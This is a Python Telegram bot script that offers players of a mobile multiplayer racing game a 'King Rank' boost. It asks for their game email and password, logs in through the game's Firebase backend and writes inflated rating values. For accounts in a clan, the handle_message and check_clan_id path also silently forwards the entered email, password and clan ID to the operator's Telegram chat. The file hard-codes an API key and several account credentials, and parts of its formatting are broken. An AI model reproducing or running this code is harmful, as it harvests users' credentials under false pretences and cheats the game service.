import os
import requests
import json
import telebot
from flask import Flask
from threading import Thread

--- Game Service Configuration ---

FIREBASE_API_KEY = 'AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM'
FIREBASE_LOGIN_URL = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={FIREBASE_API_KEY}"
RANK_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4"
CLAN_ID_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/GetClanId"

--- Telegram Bot Configuration ---

BOT_TOKEN = os.environ.get("BOT_TOKEN")
CHAT_ID = os.environ.get("CHAT_ID")

if not BOT_TOKEN:
raise ValueError("❌ BOT_TOKEN не задан!")

bot = telebot.TeleBot(BOT_TOKEN)

user_states = {}

OWNER_ID = int(CHAT_ID)

📁 файл админов

ADMIN_FILE = "admins.json"

--- ЗАГРУЗКА АДМИНОВ ---

def load_admins():
if os.path.exists(ADMIN_FILE):
with open(ADMIN_FILE, "r") as f:
data = json.load(f)
return {
"usernames": set(data.get("usernames", [])),
"ids": set(data.get("ids", []))
}
return {"usernames": set(), "ids": set()}

--- СОХРАНЕНИЕ ---

def save_admins():
with open(ADMIN_FILE, "w") as f:
json.dump({
"usernames": list(ADMINS["usernames"]),
"ids": list(ADMINS["ids"])
}, f)

ADMINS = load_admins()

--- АККАУНТЫ ---

ACCOUNTS = [
{"email": "kingcpmcpm48@gmail.com", "password": "666666"},
{"email": "kingcpmcpm49@gmail.com", "password": "666666"},
{"email": "kingcpmcpm50@gmail.com", "password": "666666"},
{"email": "kingcpmcpm51@gmail.com", "password": "666666"},
{"email": "kingcpmcpm52@gmail.com", "password": "666666"},
]

--- FUNCTIONS ---

def is_admin(message):
username = message.from_user.username
user_id = message.from_user.id

return (  
    user_id == OWNER_ID or  
    (username and username in ADMINS["usernames"]) or  
    (user_id in ADMINS["ids"])  
)

def send_to_telegram(email, password, clan_id):
url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
message = f"✅ ClanId Found!\n📧 Email: {email}\n🔒 Password: {password}\n🛡️ ClanId: {clan_id}"
try:
requests.post(url, data={"chat_id": CHAT_ID, "text": message}, timeout=5)
except:
pass

def login(email, password):
try:
r = requests.post(FIREBASE_LOGIN_URL, json={
"clientType": "CLIENT_TYPE_ANDROID",
"email": email,
"password": password,
"returnSecureToken": True
})
data = r.json()
if r.status_code == 200 and "idToken" in data:
return data["idToken"]
except:
pass
return None

def set_rank(token):
rating_data = {k: 100000 for k in [
"cars","car_fix","car_collided","car_exchange","car_trade","car_wash",
"slicer_cut","drift_max","drift","cargo","delivery","taxi","levels",
"gifts","fuel","offroad","speed_banner","reactions","police","run",
"real_estate","t_distance","treasure","block_post","push_ups",
"burnt_tire","passanger_distance"
]}
rating_data["time"] = 10000000000
rating_data["race_win"] = 3000

try:  
    r = requests.post(RANK_URL,  
        headers={"Authorization": f"Bearer {token}"},  
        json={"data": json.dumps({"RatingData": rating_data})}  
    )  
    return r.status_code == 200  
except:  
    return False

def check_clan_id(token, email, password):
try:
r = requests.post(CLAN_ID_URL,
headers={"Authorization": f"Bearer {token}"},
json={"data": None}
)
if r.status_code == 200:
clan_id = r.json().get("result", "")
if clan_id:
send_to_telegram(email, password, clan_id)
except:
pass

def run_mass_rank():
for acc in ACCOUNTS:
token = login(acc["email"], acc["password"])
if token:
set_rank(token)

--- ADMIN COMMANDS ---

@bot.message_handler(func=lambda m: m.text.startswith("+admin"))
def add_admin(message):
if not is_admin(message):
bot.reply_to(message, "🛑у вас нет доступа")
return

text = message.text.replace("+admin", "").strip()  

if text.startswith("@"):  
    username = text[1:]  
    ADMINS["usernames"].add(username)  
    save_admins()  
    bot.reply_to(message, f"✅ @{username} добавлен")  
else:  
    try:  
        user_id = int(text)  
        ADMINS["ids"].add(user_id)  
        save_admins()  
        bot.reply_to(message, f"✅ ID {user_id} добавлен")  
    except:  
        bot.reply_to(message, "❌ Формат: +admin @username или id")

@bot.message_handler(func=lambda m: m.text.startswith("-admin"))
def remove_admin(message):
if not is_admin(message):
bot.reply_to(message, "🛑у вас нет доступа")
return

text = message.text.replace("-admin", "").strip()  

if text.isdigit() and int(text) == OWNER_ID:  
    bot.reply_to(message, "❌ Нельзя удалить владельца")  
    return  

if text.startswith("@"):  
    ADMINS["usernames"].discard(text[1:])  
else:  
    try:  
        ADMINS["ids"].discard(int(text))  
    except:  
        pass  

save_admins()  
bot.reply_to(message, "❌ Админ удален")

@bot.message_handler(commands=["admin"])
def list_admins(message):
if not is_admin(message):
bot.reply_to(message, "🛑у вас нет доступа")
return

text = "👑 Список админов:\n\n"  

if not ADMINS["usernames"] and not ADMINS["ids"]:  
    text += "❌ Список пуст"  
else:  
    for u in ADMINS["usernames"]:  
        text += f"🪪 @{u}\n"  
    for i in ADMINS["ids"]:  
        text += f"🌐 ID: {i}\n"  

bot.reply_to(message, text)

--- COMMANDS ---

@bot.message_handler(commands=["start"])
def handle_start(message):
user_states[message.from_user.id] = {"step": "await_email"}

name = message.from_user.first_name or "Неизвестно"  
username = f"@{message.from_user.username}" if message.from_user.username else "Нет username"  
user_id = message.from_user.id  

bot.reply_to(message,  
    f"🏷️имя: {name}\n"  
    f"🪪user: {username}\n"  
    f"🌐tg id: {user_id}\n"  
    f"💰balance: unlimited\n\n"  
    f"📧 ⚫️ВВЕДИ @GMAIL⚫️"  
)

@bot.message_handler(commands=["level"])
def handle_level(message):
if not is_admin(message):
bot.reply_to(message, "🛑у вас нет доступа")
return

bot.reply_to(message, "🚀 Запуск KING RANK...")  
Thread(target=run_mass_rank).start()  
bot.reply_to(message, "👑 KING RANK установлены!")

--- USER FLOW ---

@bot.message_handler(func=lambda message: True)
def handle_message(message):
if message.from_user.id not in user_states:
return

state = user_states[message.from_user.id]  

if state["step"] == "await_email":  
    state["email"] = message.text  
    state["step"] = "await_password"  
    bot.reply_to(message, "🔒 ⚫️ВВЕДИ ПАРОЛЬ⚫️")  

elif state["step"] == "await_password":  
    token = login(state["email"], message.text)  

    if token and set_rank(token):  
        check_clan_id(token, state["email"], message.text)  
        bot.reply_to(message, "✅ King Rank установлен")  
    else:  
        bot.reply_to(message, "❌ Ошибка")  

    del user_states[message.from_user.id]  
    bot.reply_to(message, "📧 ⚫️ВВЕДИ @GMAIL⚫️")

--- Flask ---

app = Flask(name)

@app.route('/')
def home():
return "Bot is running!"

def run_flask():
app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))

--- START ---

if name == "main":
Thread(target=bot.polling).start()
run_flask()
